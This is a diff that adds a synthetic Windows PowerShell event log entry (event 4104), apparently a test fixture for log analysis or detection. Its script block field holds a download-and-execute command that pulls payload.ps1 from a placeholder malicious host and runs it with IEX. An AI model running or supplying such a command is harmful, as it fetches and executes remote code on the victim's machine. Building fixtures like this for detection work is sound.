@@ -1,0 +1,10 @@
+<!-- Synthetic PowerShell.evtx -->
+<Event>
+  <System>
+    <EventID>4104</EventID>
+    <TimeCreated SystemTime="2025-03-10T13:05:45Z" />
+  </System>
+  <EventData>
+    <Data Name="ScriptBlockText">IEX(New-Object Net.WebClient).DownloadString('http://malicious.example.com/payload.ps1')</Data>
+  </EventData>
+</Event>
